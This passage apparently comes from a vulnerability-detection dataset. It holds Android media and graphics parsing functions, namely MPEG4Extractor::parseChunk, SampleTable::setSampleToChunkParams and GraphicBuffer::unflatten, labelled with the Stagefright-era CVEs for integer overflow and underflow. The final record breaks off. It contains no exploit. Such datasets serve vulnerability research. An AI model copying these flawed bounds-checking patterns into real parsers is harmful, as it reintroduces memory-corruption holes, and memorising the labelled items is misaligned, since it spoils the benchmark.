(mDataSource->readAt(data_offset, &version, 1) < 1) {\n return ERROR_IO;\n }\n\n uint32_t entry_count;\n if (!mDataSource->getUInt32(data_offset + 4, &entry_count)) {\n return ERROR_IO;\n }\n\n if (entry_count != 1) {\n                ALOGW(\"ignoring edit list with %d entries\", entry_count);\n } else if (mHeaderTimescale == 0) {\n                ALOGW(\"ignoring edit list because timescale is 0\");\n } else {\n off64_t entriesoffset = data_offset + 8;\n uint64_t segment_duration;\n int64_t media_time;\n\n if (version == 1) {\n if (!mDataSource->getUInt64(entriesoffset, &segment_duration) ||\n !mDataSource->getUInt64(entriesoffset + 8, (uint64_t*)&media_time)) {\n return ERROR_IO;\n }\n } else if (version == 0) {\n uint32_t sd;\n int32_t mt;\n if (!mDataSource->getUInt32(entriesoffset, &sd) ||\n !mDataSource->getUInt32(entriesoffset + 4, (uint32_t*)&mt)) {\n return ERROR_IO;\n }\n                    segment_duration = sd;\n                    media_time = mt;\n } else {\n return ERROR_IO;\n }\n\n uint64_t halfscale = mHeaderTimescale / 2;\n                segment_duration = (segment_duration * 1000000 + halfscale)/ mHeaderTimescale;\n                media_time = (media_time * 1000000 + halfscale) / mHeaderTimescale;\n\n int64_t duration;\n int32_t samplerate;\n if (!mLastTrack) {\n return ERROR_MALFORMED;\n }\n if (mLastTrack->meta->findInt64(kKeyDuration, &duration) &&\n                        mLastTrack->meta->findInt32(kKeySampleRate, &samplerate)) {\n\n int64_t delay = (media_time  * samplerate + 500000) / 1000000;\n                    mLastTrack->meta->setInt32(kKeyEncoderDelay, delay);\n\n int64_t paddingus = duration - (segment_duration + media_time);\n if (paddingus < 0) {\n                        paddingus = 0;\n }\n int64_t paddingsamples = (paddingus * samplerate + 500000) / 1000000;\n                    mLastTrack->meta->setInt32(kKeyEncoderPadding, paddingsamples);\n }\n }\n break;\n }\n\n case FOURCC('f', 'r', 'm', 'a'):\n {\n *offset += chunk_size;\n\n uint32_t original_fourcc;\n if (mDataSource->readAt(data_offset, &original_fourcc, 4) < 4) {\n return ERROR_IO;\n }\n            original_fourcc = ntohl(original_fourcc);\n            ALOGV(\"read original format: %d\", original_fourcc);\n            mLastTrack->meta->setCString(kKeyMIMEType, FourCC2MIME(original_fourcc));\n uint32_t num_channels = 0;\n uint32_t sample_rate = 0;\n if (AdjustChannelsAndRate(original_fourcc, &num_channels, &sample_rate)) {\n                mLastTrack->meta->setInt32(kKeyChannelCount, num_channels);\n                mLastTrack->meta->setInt32(kKeySampleRate, sample_rate);\n }\n break;\n }\n\n case FOURCC('t', 'e', 'n', 'c'):\n {\n *offset += chunk_size;\n\n if (chunk_size < 32) {\n return ERROR_MALFORMED;\n }\n\n char buf[4];\n            memset(buf, 0, 4);\n if (mDataSource->readAt(data_offset + 4, buf + 1, 3) < 3) {\n return ERROR_IO;\n }\n uint32_t defaultAlgorithmId = ntohl(*((int32_t*)buf));\n if (defaultAlgorithmId > 1) {\n return ERROR_MALFORMED;\n }\n\n            memset(buf, 0, 4);\n if (mDataSource->readAt(data_offset + 7, buf + 3, 1) < 1) {\n return ERROR_IO;\n }\n uint32_t defaultIVSize = ntohl(*((int32_t*)buf));\n\n if ((defaultAlgorithmId == 0 && defaultIVSize != 0) ||\n (defaultAlgorithmId != 0 && defaultIVSize == 0)) {\n return ERROR_MALFORMED;\n } else if (defaultIVSize != 0 &&\n                    defaultIVSize != 8 &&\n                    defaultIVSize != 16) {\n return ERROR_MALFORMED;\n }\n\n uint8_t defaultKeyId[16];\n\n if (mDataSource->readAt(data_offset + 8, &defaultKeyId, 16) < 16) {\n return ERROR_IO;\n }\n\n            mLastTrack->meta->setInt32(kKeyCryptoMode, defaultAlgorithmId);\n            mLastTrack->meta->setInt32(kKeyCryptoDefaultIVSize, defaultIVSize);\n            mLastTrack->meta->setData(kKeyCryptoKey, 'tenc', defaultKeyId, 16);\n break;\n }\n\n case FOURCC('t', 'k', 'h', 'd'):\n {\n *offset += chunk_size;\n\n status_t err;\n if ((err = parseTrackHeader(data_offset, chunk_data_size)) != OK) {\n return err;\n }\n\n break;\n }\n\n case FOURCC('p', 's', 's', 'h'):\n {\n *offset += chunk_size;\n\n PsshInfo pssh;\n\n if (mDataSource->readAt(data_offset + 4, &pssh.uuid, 16) < 16) {\n return ERROR_IO;\n }\n\n uint32_t psshdatalen = 0;\n if (mDataSource->readAt(data_offset + 20, &psshdatalen, 4) < 4) {\n return ERROR_IO;\n }\n            pssh.datalen = ntohl(psshdatalen);\n            ALOGV(\"pssh data size: %d\", pssh.datalen);\n if (pssh.datalen + 20 > chunk_size) {\n return ERROR_MALFORMED;\n }\n\n            pssh.data = new (std::nothrow) uint8_t[pssh.datalen];\n if (pssh.data == NULL) {\n return ERROR_MALFORMED;\n }\n            ALOGV(\"allocated pssh @ %p\", pssh.data);\n ssize_t requested = (ssize_t) pssh.datalen;\n if (mDataSource->readAt(data_offset + 24, pssh.data, requested) < requested) {\n return ERROR_IO;\n }\n            mPssh.push_back(pssh);\n\n break;\n }\n\n case FOURCC('m', 'd', 'h', 'd'):\n {\n *offset += chunk_size;\n\n if (chunk_data_size < 4 || mLastTrack == NULL) {\n return ERROR_MALFORMED;\n }\n\n uint8_t version;\n if (mDataSource->readAt(\n                        data_offset, &version, sizeof(version))\n < (ssize_t)sizeof(version)) {\n return ERROR_IO;\n }\n\n off64_t timescale_offset;\n\n if (version == 1) {\n                timescale_offset = data_offset + 4 + 16;\n } else if (version == 0) {\n                timescale_offset = data_offset + 4 + 8;\n } else {\n return ERROR_IO;\n }\n\n uint32_t timescale;\n if (mDataSource->readAt(\n                        timescale_offset, &timescale, sizeof(timescale))\n < (ssize_t)sizeof(timescale)) {\n return ERROR_IO;\n }\n\n            mLastTrack->timescale = ntohl(timescale);\n\n int64_t duration = 0;\n if (version == 1) {\n if (mDataSource->readAt(\n                            timescale_offset + 4, &duration, sizeof(duration))\n < (ssize_t)sizeof(duration)) {\n return ERROR_IO;\n }\n if (duration != -1) {\n                    duration = ntoh64(duration);\n }\n } else {\n uint32_t duration32;\n if (mDataSource->readAt(\n                            timescale_offset + 4, &duration32, sizeof(duration32))\n < (ssize_t)sizeof(duration32)) {\n return ERROR_IO;\n }\n if (duration32 != 0xffffffff) {\n                    duration = ntohl(duration32);\n }\n }\n if (duration != 0) {\n                mLastTrack->meta->setInt64(\n                        kKeyDuration, (duration * 1000000) / mLastTrack->timescale);\n }\n\n uint8_t lang[2];\n off64_t lang_offset;\n if (version == 1) {\n                lang_offset = timescale_offset + 4 + 8;\n } else if (version == 0) {\n                lang_offset = timescale_offset + 4 + 4;\n } else {\n return ERROR_IO;\n }\n\n if (mDataSource->readAt(lang_offset, &lang, sizeof(lang))\n < (ssize_t)sizeof(lang)) {\n return ERROR_IO;\n }\n\n char lang_code[4];\n            lang_code[0] = ((lang[0] >> 2) & 0x1f) + 0x60;\n            lang_code[1] = ((lang[0] & 0x3) << 3 | (lang[1] >> 5)) + 0x60;\n            lang_code[2] = (lang[1] & 0x1f) + 0x60;\n            lang_code[3] = '\\0';\n\n            mLastTrack->meta->setCString(\n                    kKeyMediaLanguage, lang_code);\n\n break;\n }\n\n case FOURCC('s', 't', 's', 'd'):\n {\n if (chunk_data_size < 8) {\n return ERROR_MALFORMED;\n }\n\n uint8_t buffer[8];\n if (chunk_data_size < (off64_t)sizeof(buffer)) {\n return ERROR_MALFORMED;\n }\n\n if (mDataSource->readAt(\n                        data_offset, buffer, 8) < 8) {\n return ERROR_IO;\n }\n\n if (U32_AT(buffer) != 0) {\n return ERROR_MALFORMED;\n }\n\n uint32_t entry_count = U32_AT(&buffer[4]);\n\n if (entry_count > 1) {\n const char *mime;\n                CHECK(mLastTrack->meta->findCString(kKeyMIMEType, &mime));\n if (strcasecmp(mime, MEDIA_MIMETYPE_TEXT_3GPP) &&\n                        strcasecmp(mime, \"application/octet-stream\")) {\n                    mLastTrack->skipTrack = true;\n *offset += chunk_size;\n break;\n }\n }\n off64_t stop_offset = *offset + chunk_size;\n *offset = data_offset + 8;\n for (uint32_t i = 0; i < entry_count; ++i) {\n status_t err = parseChunk(offset, depth + 1);\n if (err != OK) {\n return err;\n }\n }\n\n if (*offset != stop_offset) {\n return ERROR_MALFORMED;\n }\n break;\n }\n\n case FOURCC('m', 'p', '4', 'a'):\n case FOURCC('e', 'n', 'c', 'a'):\n case FOURCC('s', 'a', 'm', 'r'):\n case FOURCC('s', 'a', 'w', 'b'):\n {\n uint8_t buffer[8 + 20];\n if (chunk_data_size < (ssize_t)sizeof(buffer)) {\n return ERROR_MALFORMED;\n }\n\n if (mDataSource->readAt(\n                        data_offset, buffer, sizeof(buffer)) < (ssize_t)sizeof(buffer)) {\n return ERROR_IO;\n }\n\n uint16_t data_ref_index = U16_AT(&buffer[6]);\n uint32_t num_channels = U16_AT(&buffer[16]);\n\n uint16_t sample_size = U16_AT(&buffer[18]);\n uint32_t sample_rate = U32_AT(&buffer[24]) >> 16;\n\n if (chunk_type != FOURCC('e', 'n', 'c', 'a')) {\n                mLastTrack->meta->setCString(kKeyMIMEType, FourCC2MIME(chunk_type));\n AdjustChannelsAndRate(chunk_type, &num_channels, &sample_rate);\n }\n            ALOGV(\"*** coding='%s' %d channels, size %d, rate %d\\n\",\n                   chunk, num_channels, sample_size, sample_rate);\n            mLastTrack->meta->setInt32(kKeyChannelCount, num_channels);\n            mLastTrack->meta->setInt32(kKeySampleRate, sample_rate);\n\n off64_t stop_offset = *offset + chunk_size;\n *offset = data_offset + sizeof(buffer);\n while (*offset < stop_offset) {\n status_t err = parseChunk(offset, depth + 1);\n if (err != OK) {\n return err;\n }\n }\n\n if (*offset != stop_offset) {\n return ERROR_MALFORMED;\n }\n break;\n }\n\n case FOURCC('m', 'p', '4', 'v'):\n case FOURCC('e', 'n', 'c', 'v'):\n case FOURCC('s', '2', '6', '3'):\n case FOURCC('H', '2', '6', '3'):\n case FOURCC('h', '2', '6', '3'):\n case FOURCC('a', 'v', 'c', '1'):\n case FOURCC('h', 'v', 'c', '1'):\n case FOURCC('h', 'e', 'v', '1'):\n {\n            mHasVideo = true;\n\n uint8_t buffer[78];\n if (chunk_data_size < (ssize_t)sizeof(buffer)) {\n return ERROR_MALFORMED;\n }\n\n if (mDataSource->readAt(\n                        data_offset, buffer, sizeof(buffer)) < (ssize_t)sizeof(buffer)) {\n return ERROR_IO;\n }\n\n uint16_t data_ref_index = U16_AT(&buffer[6]);\n uint16_t width = U16_AT(&buffer[6 + 18]);\n uint16_t height = U16_AT(&buffer[6 + 20]);\n\n if (width == 0)  width  = 352;\n if (height == 0) height = 288;\n\n\n if (chunk_type != FOURCC('e', 'n', 'c', 'v')) {\n                mLastTrack->meta->setCString(kKeyMIMEType, FourCC2MIME(chunk_type));\n }\n            mLastTrack->meta->setInt32(kKeyWidth, width);\n            mLastTrack->meta->setInt32(kKeyHeight, height);\n\n off64_t stop_offset = *offset + chunk_size;\n *offset = data_offset + sizeof(buffer);\n while (*offset < stop_offset) {\n status_t err = parseChunk(offset, depth + 1);\n if (err != OK) {\n return err;\n }\n }\n\n if (*offset != stop_offset) {\n return ERROR_MALFORMED;\n }\n break;\n }\n\n case FOURCC('s', 't', 'c', 'o'):\n case FOURCC('c', 'o', '6', '4'):\n {\n status_t err =\n                mLastTrack->sampleTable->setChunkOffsetParams(\n                        chunk_type, data_offset, chunk_data_size);\n\n *offset += chunk_size;\n\n if (err != OK) {\n return err;\n }\n\n break;\n }\n\n case FOURCC('s', 't', 's', 'c'):\n {\n status_t err =\n                mLastTrack->sampleTable->setSampleToChunkParams(\n                        data_offset, chunk_data_size);\n\n *offset += chunk_size;\n\n if (err != OK) {\n return err;\n }\n\n break;\n }\n\n case FOURCC('s', 't', 's', 'z'):\n case FOURCC('s', 't', 'z', '2'):\n {\n status_t err =\n                mLastTrack->sampleTable->setSampleSizeParams(\n                        chunk_type, data_offset, chunk_data_size);\n\n *offset += chunk_size;\n\n if (err != OK) {\n return err;\n }\n\n size_t max_size;\n            err = mLastTrack->sampleTable->getMaxSampleSize(&max_size);\n\n if (err != OK) {\n return err;\n }\n\n if (max_size != 0) {\n                mLastTrack->meta->setInt32(kKeyMaxInputSize, max_size + 10 * 2);\n } else {\n int32_t width, height;\n if (!mLastTrack->meta->findInt32(kKeyWidth, &width) ||\n !mLastTrack->meta->findInt32(kKeyHeight, &height)) {\n                    ALOGE(\"No width or height, assuming worst case 1080p\");\n                    width = 1920;\n                    height = 1080;\n }\n\n const char *mime;\n                CHECK(mLastTrack->meta->findCString(kKeyMIMEType, &mime));\n if (!strcmp(mime, MEDIA_MIMETYPE_VIDEO_AVC)) {\n                    max_size = ((width + 15) / 16) * ((height + 15) / 16) * 192;\n } else {\n                    max_size = width * height * 3 / 2;\n }\n                mLastTrack->meta->setInt32(kKeyMaxInputSize, max_size);\n }\n\n const char *mime;\n            CHECK(mLastTrack->meta->findCString(kKeyMIMEType, &mime));\n if (!strncasecmp(\"video/\", mime, 6)) {\n size_t nSamples = mLastTrack->sampleTable->countSamples();\n int64_t durationUs;\n if (mLastTrack->meta->findInt64(kKeyDuration, &durationUs)) {\n if (durationUs > 0) {\n int32_t frameRate = (nSamples * 1000000LL +\n (durationUs >> 1)) / durationUs;\n                        mLastTrack->meta->setInt32(kKeyFrameRate, frameRate);\n }\n }\n }\n\n break;\n }\n\n case FOURCC('s', 't', 't', 's'):\n {\n *offset += chunk_size;\n\n status_t err =\n                mLastTrack->sampleTable->setTimeToSampleParams(\n                        data_offset, chunk_data_size);\n\n if (err != OK) {\n return err;\n }\n\n break;\n }\n\n case FOURCC('c', 't', 't', 's'):\n {\n *offset += chunk_size;\n\n status_t err =\n                mLastTrack->sampleTable->setCompositionTimeToSampleParams(\n                        data_offset, chunk_data_size);\n\n if (err != OK) {\n return err;\n }\n\n break;\n }\n\n case FOURCC('s', 't', 's', 's'):\n {\n *offset += chunk_size;\n\n status_t err =\n                mLastTrack->sampleTable->setSyncSampleParams(\n                        data_offset, chunk_data_size);\n\n if (err != OK) {\n return err;\n }\n\n break;\n }\n\n case FOURCC('\\xA9', 'x', 'y', 'z'):\n {\n *offset += chunk_size;\n\n if (chunk_data_size < 8) {\n return ERROR_MALFORMED;\n }\n\n char buffer[18];\n\n off64_t location_length = chunk_data_size - 5;\n if (location_length >= (off64_t) sizeof(buffer)) {\n return ERROR_MALFORMED;\n }\n\n if (mDataSource->readAt(\n                        data_offset + 4, buffer, location_length) < location_length) {\n return ERROR_IO;\n }\n\n            buffer[location_length] = '\\0';\n            mFileMetaData->setCString(kKeyLocation, buffer);\n break;\n }\n\n case FOURCC('e', 's', 'd', 's'):\n {\n *offset += chunk_size;\n\n if (chunk_data_size < 4) {\n return ERROR_MALFORMED;\n }\n\n uint8_t buffer[256];\n if (chunk_data_size > (off64_t)sizeof(buffer)) {\n return ERROR_BUFFER_TOO_SMALL;\n }\n\n if (mDataSource->readAt(\n                        data_offset, buffer, chunk_data_size) < chunk_data_size) {\n return ERROR_IO;\n }\n\n if (U32_AT(buffer) != 0) {\n return ERROR_MALFORMED;\n }\n\n            mLastTrack->meta->setData(\n                    kKeyESDS, kTypeESDS, &buffer[4], chunk_data_size - 4);\n\n if (mPath.size() >= 2\n && mPath[mPath.size() - 2] == FOURCC('m', 'p', '4', 'a')) {\n\n status_t err = updateAudioTrackInfoFromESDS_MPEG4Audio(\n &buffer[4], chunk_data_size - 4);\n\n if (err != OK) {\n return err;\n }\n }\n\n break;\n }\n\n case FOURCC('a', 'v', 'c', 'C'):\n {\n *offset += chunk_size;\n\n            sp<ABuffer> buffer = new ABuffer(chunk_data_size);\n\n if (mDataSource->readAt(\n                        data_offset, buffer->data(), chunk_data_size) < chunk_data_size) {\n return ERROR_IO;\n }\n\n            mLastTrack->meta->setData(\n                    kKeyAVCC, kTypeAVCC, buffer->data(), chunk_data_size);\n\n break;\n }\n case FOURCC('h', 'v', 'c', 'C'):\n {\n            sp<ABuffer> buffer = new ABuffer(chunk_data_size);\n\n if (mDataSource->readAt(\n                        data_offset, buffer->data(), chunk_data_size) < chunk_data_size) {\n return ERROR_IO;\n }\n\n            mLastTrack->meta->setData(\n                    kKeyHVCC, kTypeHVCC, buffer->data(), chunk_data_size);\n\n *offset += chunk_size;\n break;\n }\n\n case FOURCC('d', '2', '6', '3'):\n {\n *offset += chunk_size;\n /*\n             * d263 contains a fixed 7 bytes part:\n             *   vendor - 4 bytes\n             *   version - 1 byte\n             *   level - 1 byte\n             *   profile - 1 byte\n             * optionally, \"d263\" box itself may contain a 16-byte\n             * bit rate box (bitr)\n             *   average bit rate - 4 bytes\n             *   max bit rate - 4 bytes\n             */\n char buffer[23];\n if (chunk_data_size != 7 &&\n                chunk_data_size != 23) {\n                ALOGE(\"Incorrect D263 box size %lld\", chunk_data_size);\n return ERROR_MALFORMED;\n }\n\n if (mDataSource->readAt(\n                    data_offset, buffer, chunk_data_size) < chunk_data_size) {\n return ERROR_IO;\n }\n\n            mLastTrack->meta->setData(kKeyD263, kTypeD263, buffer, chunk_data_size);\n\n break;\n }\n\n case FOURCC('m', 'e', 't', 'a'):\n {\n uint8_t buffer[4];\n if (chunk_data_size < (off64_t)sizeof(buffer)) {\n *offset += chunk_size;\n return ERROR_MALFORMED;\n }\n\n if (mDataSource->readAt(\n                        data_offset, buffer, 4) < 4) {\n *offset += chunk_size;\n return ERROR_IO;\n }\n\n if (U32_AT(buffer) != 0) {\n\n *offset += chunk_size;\n return OK;\n }\n\n off64_t stop_offset = *offset + chunk_size;\n *offset = data_offset + sizeof(buffer);\n while (*offset < stop_offset) {\n status_t err = parseChunk(offset, depth + 1);\n if (err != OK) {\n return err;\n }\n }\n\n if (*offset != stop_offset) {\n return ERROR_MALFORMED;\n }\n break;\n }\n\n case FOURCC('m', 'e', 'a', 'n'):\n case FOURCC('n', 'a', 'm', 'e'):\n case FOURCC('d', 'a', 't', 'a'):\n {\n *offset += chunk_size;\n\n if (mPath.size() == 6 && underMetaDataPath(mPath)) {\n status_t err = parseITunesMetaData(data_offset, chunk_data_size);\n\n if (err != OK) {\n return err;\n }\n }\n\n break;\n }\n\n case FOURCC('m', 'v', 'h', 'd'):\n {\n *offset += chunk_size;\n\n if (chunk_data_size < 32) {\n return ERROR_MALFORMED;\n }\n\n uint8_t header[32];\n if (mDataSource->readAt(\n                        data_offset, header, sizeof(header))\n < (ssize_t)sizeof(header)) {\n return ERROR_IO;\n }\n\n uint64_t creationTime;\n uint64_t duration = 0;\n if (header[0] == 1) {\n                creationTime = U64_AT(&header[4]);\n                mHeaderTimescale = U32_AT(&header[20]);\n                duration = U64_AT(&header[24]);\n if (duration == 0xffffffffffffffff) {\n                    duration = 0;\n }\n } else if (header[0] != 0) {\n return ERROR_MALFORMED;\n } else {\n                creationTime = U32_AT(&header[4]);\n                mHeaderTimescale = U32_AT(&header[12]);\n uint32_t d32 = U32_AT(&header[16]);\n if (d32 == 0xffffffff) {\n                    d32 = 0;\n }\n                duration = d32;\n }\n if (duration != 0) {\n                mFileMetaData->setInt64(kKeyDuration, duration * 1000000 / mHeaderTimescale);\n }\n\n String8 s;\n            convertTimeToDate(creationTime, &s);\n\n            mFileMetaData->setCString(kKeyDate, s.string());\n\n break;\n }\n\n case FOURCC('m', 'e', 'h', 'd'):\n {\n *offset += chunk_size;\n\n if (chunk_data_size < 8) {\n return ERROR_MALFORMED;\n }\n\n uint8_t flags[4];\n if (mDataSource->readAt(\n                        data_offset, flags, sizeof(flags))\n < (ssize_t)sizeof(flags)) {\n return ERROR_IO;\n }\n\n uint64_t duration = 0;\n if (flags[0] == 1) {\n if (chunk_data_size < 12) {\n return ERROR_MALFORMED;\n }\n                mDataSource->getUInt64(data_offset + 4, &duration);\n if (duration == 0xffffffffffffffff) {\n                    duration = 0;\n }\n } else if (flags[0] == 0) {\n uint32_t d32;\n                mDataSource->getUInt32(data_offset + 4, &d32);\n if (d32 == 0xffffffff) {\n                    d32 = 0;\n }\n                duration = d32;\n } else {\n return ERROR_MALFORMED;\n }\n\n if (duration != 0) {\n                mFileMetaData->setInt64(kKeyDuration, duration * 1000000 / mHeaderTimescale);\n }\n\n break;\n }\n\n case FOURCC('m', 'd', 'a', 't'):\n {\n            ALOGV(\"mdat chunk, drm: %d\", mIsDrm);\n if (!mIsDrm) {\n *offset += chunk_size;\n break;\n }\n\n if (chunk_size < 8) {\n return ERROR_MALFORMED;\n }\n\n return parseDrmSINF(offset, data_offset);\n }\n\n case FOURCC('h', 'd', 'l', 'r'):\n {\n *offset += chunk_size;\n\n uint32_t buffer;\n if (mDataSource->readAt(\n                        data_offset + 8, &buffer, 4) < 4) {\n return ERROR_IO;\n }\n\n uint32_t type = ntohl(buffer);\n if (type == FOURCC('t', 'e', 'x', 't') || type == FOURCC('s', 'b', 't', 'l')) {\n                mLastTrack->meta->setCString(kKeyMIMEType, MEDIA_MIMETYPE_TEXT_3GPP);\n }\n\n break;\n }\n\n case FOURCC('t', 'r', 'e', 'x'):\n {\n *offset += chunk_size;\n\n if (chunk_data_size < 24) {\n return ERROR_IO;\n }\n uint32_t duration;\n Trex trex;\n if (!mDataSource->getUInt32(data_offset + 4, &trex.track_ID) ||\n !mDataSource->getUInt32(data_offset + 8, &trex.default_sample_description_index) ||\n !mDataSource->getUInt32(data_offset + 12, &trex.default_sample_duration) ||\n !mDataSource->getUInt32(data_offset + 16, &trex.default_sample_size) ||\n !mDataSource->getUInt32(data_offset + 20, &trex.default_sample_flags)) {\n return ERROR_IO;\n }\n            mTrex.add(trex);\n break;\n }\n\n case FOURCC('t', 'x', '3', 'g'):\n {\n uint32_t type;\n const void *data;\n size_t size = 0;\n if (!mLastTrack->meta->findData(\n                    kKeyTextFormatData, &type, &data, &size)) {\n\n                 size = 0;\n             }\n \n            if ((chunk_size > SIZE_MAX) || (SIZE_MAX - chunk_size <= size)) {\n                 return ERROR_MALFORMED;\n             }\n \n uint8_t *buffer = new uint8_t[size + chunk_size];\n if (buffer == NULL) {\n return ERROR_MALFORMED;\n }\n\n if (size > 0) {\n                memcpy(buffer, data, size);\n }\n\n if ((size_t)(mDataSource->readAt(*offset, buffer + size, chunk_size))\n < chunk_size) {\n delete[] buffer;\n                buffer = NULL;\n\n *offset += chunk_size;\n return ERROR_IO;\n }\n\n            mLastTrack->meta->setData(\n                    kKeyTextFormatData, 0, buffer, size + chunk_size);\n\n delete[] buffer;\n\n *offset += chunk_size;\n break;\n }\n\n case FOURCC('c', 'o', 'v', 'r'):\n {\n *offset += chunk_size;\n\n if (mFileMetaData != NULL) {\n                ALOGV(\"chunk_data_size = %lld and data_offset = %lld\",\n                        chunk_data_size, data_offset);\n\n if (chunk_data_size >= SIZE_MAX - 1) {\n return ERROR_MALFORMED;\n }\n                sp<ABuffer> buffer = new ABuffer(chunk_data_size + 1);\n if (mDataSource->readAt(\n                    data_offset, buffer->data(), chunk_data_size) != (ssize_t)chunk_data_size) {\n return ERROR_IO;\n }\n const int kSkipBytesOfDataBox = 16;\n if (chunk_data_size <= kSkipBytesOfDataBox) {\n return ERROR_MALFORMED;\n }\n\n                mFileMetaData->setData(\n                    kKeyAlbumArt, MetaData::TYPE_NONE,\n                    buffer->data() + kSkipBytesOfDataBox, chunk_data_size - kSkipBytesOfDataBox);\n }\n\n break;\n }\n\n case FOURCC('t', 'i', 't', 'l'):\n case FOURCC('p', 'e', 'r', 'f'):\n case FOURCC('a', 'u', 't', 'h'):\n case FOURCC('g', 'n', 'r', 'e'):\n case FOURCC('a', 'l', 'b', 'm'):\n case FOURCC('y', 'r', 'r', 'c'):\n {\n *offset += chunk_size;\n\n status_t err = parse3GPPMetaData(data_offset, chunk_data_size, depth);\n\n if (err != OK) {\n return err;\n }\n\n break;\n }\n\n case FOURCC('I', 'D', '3', '2'):\n {\n *offset += chunk_size;\n\n if (chunk_data_size < 6) {\n return ERROR_MALFORMED;\n }\n\n            parseID3v2MetaData(data_offset + 6);\n\n break;\n }\n\n case FOURCC('-', '-', '-', '-'):\n {\n            mLastCommentMean.clear();\n            mLastCommentName.clear();\n            mLastCommentData.clear();\n *offset += chunk_size;\n break;\n }\n\n case FOURCC('s', 'i', 'd', 'x'):\n {\n            parseSegmentIndex(data_offset, chunk_data_size);\n *offset += chunk_size;\n return UNKNOWN_ERROR; // stop parsing after sidx\n }\n\n default:\n {\n *offset += chunk_size;\n break;\n }\n }\n\n return OK;\n}\n", "func_hash": 294719024040317040861600696236303704026, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2015-3864", "cve_desc": "Integer underflow in the MPEG4Extractor::parseChunk function in MPEG4Extractor.cpp in libstagefright in mediaserver in Android before 5.1.1 LMY48M allows remote attackers to execute arbitrary code via crafted MPEG-4 data, aka internal bug 23034759.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2015-3824.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2015-3864"}
{"idx": 185164, "project": "Android", "commit_id": "2434839bbd168469f80dd9a22f1328bc81046398", "project_url": "None", "commit_url": "https://android.googlesource.com/platform/frameworks/av/+/2434839bbd168469f80dd9a22f1328bc81046398", "commit_message": "None", "target": 0, "func": "status_t SampleTable::setSampleToChunkParams(\n off64_t data_offset, size_t data_size) {\n if (mSampleToChunkOffset >= 0) {\n return ERROR_MALFORMED;\n }\n\n    mSampleToChunkOffset = data_offset;\n\n if (data_size < 8) {\n return ERROR_MALFORMED;\n }\n\n uint8_t header[8];\n if (mDataSource->readAt(\n                data_offset, header, sizeof(header)) < (ssize_t)sizeof(header)) {\n return ERROR_IO;\n }\n\n if (U32_AT(header) != 0) {\n return ERROR_MALFORMED;\n }\n\n    mNumSampleToChunkOffsets = U32_AT(&header[4]);\n\n if (data_size < 8 + mNumSampleToChunkOffsets * 12) {\n\n         return ERROR_MALFORMED;\n     }\n \n    if (SIZE_MAX / sizeof(SampleToChunkEntry) <= mNumSampleToChunkOffsets)\n        return ERROR_OUT_OF_RANGE;\n\n     mSampleToChunkEntries =\n         new SampleToChunkEntry[mNumSampleToChunkOffsets];\n \n for (uint32_t i = 0; i < mNumSampleToChunkOffsets; ++i) {\n uint8_t buffer[12];\n if (mDataSource->readAt(\n                    mSampleToChunkOffset + 8 + i * 12, buffer, sizeof(buffer))\n != (ssize_t)sizeof(buffer)) {\n return ERROR_IO;\n }\n\n        CHECK(U32_AT(buffer) >= 1); // chunk index is 1 based in the spec.\n\n        mSampleToChunkEntries[i].startChunk = U32_AT(buffer) - 1;\n        mSampleToChunkEntries[i].samplesPerChunk = U32_AT(&buffer[4]);\n        mSampleToChunkEntries[i].chunkDesc = U32_AT(&buffer[8]);\n }\n\n return OK;\n}\n", "func_hash": 237927794663070942311663857073783931342, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2015-1538", "cve_desc": "Integer overflow in the SampleTable::setSampleToChunkParams function in SampleTable.cpp in libstagefright in Android before 5.1.1 LMY48I allows remote attackers to execute arbitrary code via crafted atoms in MP4 data that trigger an unchecked multiplication, aka internal bug 20139950, a related issue to CVE-2015-4496.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2015-1538"}
{"idx": 185165, "project": "Android", "commit_id": "38803268570f90e97452cd9a30ac831661829091", "project_url": "None", "commit_url": "https://android.googlesource.com/platform/frameworks/native/+/38803268570f90e97452cd9a30ac831661829091", "commit_message": "None", "target": 0, "func": "status_t GraphicBuffer::unflatten(\n void const*& buffer, size_t& size, int const*& fds, size_t& count) {\n if (size < 8*sizeof(int)) return NO_MEMORY;\n\n int const* buf = static_cast<int const*>(buffer);\n if (buf[0] != 'GBFR') return BAD_TYPE;\n\n\n     const size_t numFds  = buf[8];\n     const size_t numInts = buf[9];\n \n    const size_t maxNumber = UINT_MAX / sizeof(int);\n    if (numFds >= maxNumber || numInts >= (maxNumber - 10)) {\n        width = height = stride = format = usage = 0;\n        handle = NULL;\n        ALOGE(\"unflatten: numFds or numInts is too large: %d, %d\",\n                numFds, numInts);\n        return BAD_VALUE;\n    }\n\n     const size_t sizeNeeded = (10 + numInts) * sizeof(int);\n     if (size < sizeNeeded) return NO_MEMORY;\n \n    size_t fdCountNeeded = numFds;\n     if (count < fdCountNeeded) return NO_MEMORY;\n \n     if (handle) {\n        free_handle();\n }\n\n if (numFds || numInts) {\n        width  = buf[1];\n        height = buf[2];\n        stride = buf[3];\n\n         format = buf[4];\n         usage  = buf[5];\n         native_handle* h = native_handle_create(numFds, numInts);\n        if (!h) {\n            width = height = stride = format = usage = 0;\n            handle = NULL;\n            ALOGE(\"unflatten: native_handle_create failed\");\n            return NO_MEMORY;\n        }\n         memcpy(h->data,          fds,     numFds*sizeof(int));\n         memcpy(h->data + numFds, &buf[10], numInts*sizeof(int));\n         handle = h;\n } else {\n        width = height = stride = format = usage = 0;\n        handle = NULL;\n }\n\n    mId = static_cast<uint64_t>(buf[6]) << 32;\n    mId |= static_cast<uint32_t>(buf[7]);\n\n    mOwner = ownHandle;\n\n if (handle != 0) {\n status_t err = mBufferMapper.registerBuffer(handle);\n if (err != NO_ERROR) {\n            width = height = stride = format = usage = 0;\n            handle = NULL;\n            ALOGE(\"unflatten: registerBuffer failed: %s (%d)\",\n                    strerror(-err), err);\n return err;\n }\n }\n\n    buffer = reinterpret_cast<void const*>(static_cast<int const*>(buffer) + sizeNeeded);\n    size -= sizeNeeded;\n    fds += numFds;\n    count -= numFds;\n\n return NO_ERROR;\n}\n", "func_hash": 252873766568007964689070748083898468685, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2015-1474", "cve_desc": "Multiple integer overflows in the GraphicBuffer::unflatten function in platform/frameworks/native/libs/ui/GraphicBuffer.cpp in Android through 5.0 allow attackers to gain privileges or cause a denial of service (memory corruption) via vectors that trigger a large number of (1) 